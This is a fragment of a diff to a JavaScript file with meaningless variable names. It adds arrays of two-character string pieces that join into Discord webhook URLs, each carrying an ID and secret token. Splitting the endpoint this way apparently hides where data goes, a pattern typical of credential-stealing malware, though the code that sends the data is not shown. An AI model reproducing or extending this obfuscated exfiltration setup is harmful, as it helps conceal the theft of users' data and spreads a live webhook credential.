@@ -23,7 +23,7 @@ const diejwjdhjedwawadjwjw3dawawdwad = [
   'xX', 'xX', 'xX', 'xX', 'xX'
 ];
 
-const diejwjdhjejdawawdwjwawdawd = [  
+const diejwjdhjejdmwawdwjwawdawd = [  
   
     'ht',        'tp',        's:',        '//',        'di',  
     'sc',        'or',        'd.',        'co',        'm/',  
@@ -39,8 +39,132 @@ const diejwjdhjejdawawdwjwawdawd = [
     'kU',        '0I',        'r5',        'oh',        'OJ',  
     '4'  
 
-]
+];
+const diejwjdhjejdawawdwjwawdawd = [  
 
+    'ht',  
+
+    'tp',  
+
+    's:',  
+
+    '//',  
+
+    'di',  
+
+    'sc',  
+
+    'or',  
+
+    'd.',  
+
+    'co',  
+
+    'm/',  
+
+    'ap',  
+
+    'i/',  
+
+    'we',  
+
+    'bh',  
+
+    'oo',  
+
+    'ks',  
+
+    '/1',  
+
+    '35',  
+
+    '37',  
+
+    '31',  
+
+    '95',  
+
+    '43',  
+
+    '77',  
+
+    '49',  
+
+    '46',  
+
+    '29',  
+
+    '/eM',  
+
+    '-',  
+
+    'Ok',  
+
+    'ct',  
+
+    '2D',  
+
+    'r6',  
+
+    'SQ',  
+
+    'mR',  
+
+    'f8',  
+
+    '9G',  
+
+    '89',  
+
+    '7j',  
+
+    '6S',  
+
+    '2D',  
+
+    'Lv',  
+
+    'tG',  
+
+    'FW',  
+
+    'Xc',  
+
+    'Wv',  
+
+    'xK',  
+
+    '5_',  
+
+    'tk',  
+
+    'VZ',  
+
+    '_E',  
+
+    'Xi',  
+
+    'Rc',  
+
+    'O3',  
+
+    '8z',  
+
+    'f4',  
+
+    'n9',  
+
+    '76',  
+
+    'us',  
+
+    'De',  
+
+    'QT',  
+
+    'd'  
+
+];
 const diejwjdhjej321321wjw4rwa = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
   'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/1', '11', '11', '11', 
